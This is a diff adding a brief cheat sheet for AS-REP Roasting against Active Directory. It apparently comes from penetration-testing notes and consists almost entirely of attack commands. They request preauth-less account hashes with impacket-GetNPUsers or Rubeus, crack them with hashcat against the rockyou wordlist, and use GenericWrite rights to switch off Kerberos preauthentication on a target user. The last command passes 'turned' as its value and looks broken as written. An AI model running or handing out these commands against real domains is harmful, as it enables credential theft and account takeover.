@@ -1,0 +1,12 @@
+#AS-REP Roasting
+#Users with preauth turn off
+impacket-GetNPUsers -dc-ip 192.168.50.70 -request   'domain.com/' -format hashcat
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+.\Rubeus.exe asreproast /nowrap
+
+#GenericWrite on User, allow to set UF_DONT_REQUIRE_PREAUTH
+Set-ADAccountControl -Identity user -DoesNotRequirePreAuth turned
+
+
+
